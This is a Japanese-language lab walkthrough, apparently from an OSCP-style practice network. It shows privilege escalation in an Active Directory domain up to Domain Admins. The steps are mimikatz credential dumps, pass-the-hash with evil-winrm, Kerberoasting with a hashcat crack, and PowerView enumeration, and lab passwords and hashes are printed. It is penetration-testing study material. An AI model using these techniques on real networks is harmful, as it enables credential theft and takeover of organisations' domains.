# 主題
ここでは、Active Directoryを低い権限から最終的にDomai Adminsの権限まで昇格する一連の流れを示す。Active Directoryを中心に話す。

流れとしては

**10.11.1.123** (ただのUsersグループ) -> **10.11.1.121** (サービスアカウント) -> 10.11.1.122 (Server Personelのユーザ) -> **10.11.1.120** (Domain Admins)

の流れ。

# 10.11.1.123 (ただのUsersグループのメンバー)

（イニシャルシェルは、http://10.11.1.123/Books にアクセスして、My Business-Period(Bizuno Library 3.1.7)とわかる。エクスプロイトがある。**初めからすでにsystem権限の状態**）

mimikatzでハッシュを取り出しても、このマシン10.11.1.123のユーザxor-app59についてのハッシュしか出てこない。すなわちActive Directoryのドメイン中の他のユーザのハッシュはmimikatzでは出てこない
（そりゃそうか。Domain Adminsの人はACのトップであり、全ユーザを管理するから各ユーザのハッシュが出てくるのか。）

ちなみにmimikatzでは、このマシンxor-app59のAdministratorのハッシュが出た：

```
Authentication Id : 0 ; 337803 (00000000:0005278b)
Authentication Id : 0 ; 337803 (00000000:0005278b)
Session           : Interactive from 0
User Name         : Administrator
Domain            : XOR-APP59
Logon Server      : XOR-APP59
Logon Time        : 9/20/2021 2:39:23 AM
SID               : S-1-5-21-3051798232-4248191986-2095020414-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : XOR-APP59
         * NTLM     : 3fee04b01f59a1001a366a7681e95699
         * SHA1     : 3a8679fbfdfea03f2d3b5a1a1aa185cca912014b
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : XOR-APP59
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : XOR-APP59
         * Password : (null)
```

だからxor-app59（10.11.1.123）には次のようにPass the Hashできる：

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -u Administrator -H 3fee04b01f59a1001a366a7681e95699  -i 10.11.1.123
```

ユーザグループだからか、サービスアカウントに対してSilver Ticket作ってサービスアカウントのシェルを起動させようとしたり、（AdministratorにOver pass the hashしようとしたり...<- いやいや、
このAdministratorって自分の、xor-app59のAdministratorのことだよ）したけど無理だった。

しかし、**Kerberoasができた！** （`Invoke-Kerberoast`でkrb5tgs型のハッシュをとって変換してhashcatでクラックするやつ）

-> これでshantewhiteというパスワードをゲット


# 10.11.1.121 (サービスアカウント）

xor-app23としてrdpじゃなくて、サービスアカウントSQLServer（PowerViewの`Get-NetUser`で表示）としてrdpでドメインをきちんと指定してアクセス：（10.11.1.121がxor-app23と分かったのは、
autoreconのnmapの結果）

```
┌──(kali㉿kali)-[~]
└─$ rdesktop -d xor.com -u SQLServer -p shantewhite 10.11.1.121
```

このSQLServerユーザでログインするとproof.txtが読める、すなわち10.11.1.121のadmin権限がある。（コマンドプロンプトを**Run as Administrator**として開ける）

**System権限にも関わらずmimikatzの`sekurlsa::logonpasswords`が効かない場合は、mimikatzの新しい方（mimikatz211.exe）を使え！** （<- 古いmimikatzにある問題だって。）


**daisyのrdpファイル発見。** mimikatzにより、daisyのパスワードが**XorPasswordIsDead17**と判明。


＜daisyについて＞

すでにsystem権限（IPアドレスは10.11.1.122)。

```
C:\Windows\system32>whoami
xor\daisy

C:\Windows\system32>ipconfig

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.1.122
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.11.0.1
```

ここまでで、10.11.1.123, 10.11.1.121, 10.11.1.122を攻略できた。ということは、残すはDomain Adminsの10.11.1.123だ！

mimikatzはここら辺にしておいて、PowerViewでActive Directoryの調査を進める。最終ゴールはDoamin Adminsに行き着くこと！！

daisyはServer_Personelのメンバーだ。

```
PS C:\> Get-NetUser Daisy


logoncount            : 15
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=Daisy,OU=ServerPersonal,OU=xorUsr,DC=xor,DC=com
objectclass           : {top, person, organizationalPerson, user}
displayname           : Daisy
lastlogontimestamp    : 12/18/2021 6:58:37 AM
userprincipalname     : daisy@xor.com
name                  : Daisy
objectsid             : S-1-5-21-2293535422-227910474-3663383505-1119
samaccountname        : daisy
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 12/18/2021 2:58:37 PM
instancetype          : 4
usncreated            : 12882
objectguid            : 9a47b615-4ee5-4016-a9da-042819b57b5c
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=xor,DC=com
dscorepropagationdata : 1/1/1601 12:00:00 AM
memberof              : CN=Server_Personel,OU=xorGrps,DC=xor,DC=com
lastlogon             : 12/18/2021 6:59:02 AM
badpwdcount           : 0
cn                    : Daisy
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/20/2019 8:07:07 PM
primarygroupid        : 513
pwdlastset            : 5/20/2019 1:07:07 PM
usnchanged            : 57501
```

以下の出力より、Domain Adminsに上り詰めるには、**Albert**か**David**のクリデンシャルをゲットすれば良い

```
PS C:\> Get-NetGroup "Domain Admins"


grouptype              : GLOBAL_SCOPE, SECURITY
admincount             : 1
iscriticalsystemobject : True
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Admins
whenchanged            : 5/20/2019 8:13:09 PM
objectsid              : S-1-5-21-2293535422-227910474-3663383505-512
objectclass            : {top, group}
cn                     : Domain Admins
usnchanged             : 13265
dscorepropagationdata  : {5/20/2019 8:13:09 PM, 5/20/2019 7:58:00 PM, 1/1/1601 12:04:16 AM}
memberof               : {CN=Denied RODC Password Replication Group,CN=Users,DC=xor,DC=com, CN=Administrators,CN=Builtin,DC=xor,DC=com}
description            : Designated administrators of the domain
distinguishedname      : CN=Domain Admins,CN=Users,DC=xor,DC=com
name                   : Domain Admins
member                 : {CN=Albert,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com, CN=David,OU=AdminPersonal,OU=xorUsr,DC=xor,DC=com,
                         CN=Administrator,CN=Users,DC=xor,DC=com}
```

やはり！daisy（10.11.1.122）のとこにdavidのクリデンシャルがあった！！

```
Authentication Id : 0 ; 412579 (00000000:00064ba3)
Session           : Batch from 0
User Name         : david
Domain            : xor
Logon Server      : XOR-DC01
Logon Time        : 12/18/2021 7:45:13 AM
SID               : S-1-5-21-2293535422-227910474-3663383505-1123
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : xor
         * NTLM     : d4738e8c31d43e0147f27894a20e6683
         * SHA1     : b1c2b2c766e7ad7688029ebc42fbacabae7fba72
         * DPAPI    : b712cb5d0fb0bdf9530c115100e2b574
        tspkg :
        wdigest :
         * Username : david
         * Domain   : xor
         * Password : (null)
        kerberos :
         * Username : david
         * Domain   : XOR.COM
         * Password : dsfdf34534tdfGDFG5rdgr
        ssp :
        credman :
```
